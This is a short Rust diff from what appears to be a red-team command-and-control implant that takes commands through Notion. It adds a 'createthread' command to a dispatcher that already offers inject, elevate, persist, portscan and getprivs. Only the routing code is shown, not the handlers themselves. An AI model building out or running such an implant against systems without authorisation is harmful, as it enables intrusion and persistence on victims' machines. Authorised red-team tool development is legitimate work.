@@ -22,6 +22,7 @@ mod sleep;
 mod shutdown;
 mod whoami;
 mod unknown;
+mod createthread;
 
 /// All the possible command types. Some have command strings, and some don't.
 pub enum CommandType {
@@ -30,6 +31,7 @@ pub enum CommandType {
     Elevate(String),
     Getprivs,
     Inject(String),
+    CreateThread(String),
     Portscan(String),
     Persist(String),
     Ps,
@@ -77,6 +79,7 @@ impl NotionCommand {
             );
             let command_type: CommandType = match t {
                 "cd"       => CommandType::Cd(command_string),
+                "createthread" => CommandType::CreateThread(command_string),
                 "download" => CommandType::Download(command_string),
                 "elevate"  => CommandType::Elevate(command_string),
                 "getprivs" => CommandType::Getprivs,
@@ -117,7 +120,8 @@ impl NotionCommand {
             CommandType::Shutdown    => shutdown::handle().await,
             CommandType::Sleep(s)    => sleep::handle(&s, config_options).await,
             CommandType::Whoami      => whoami::handle().await,
-            CommandType::Unknown(_)  => unknown::handle().await
+            CommandType::Unknown(_)  => unknown::handle().await,
+            CommandType::CreateThread(s) => createthread::handle(&s, logger).await 
         }
     }
 }
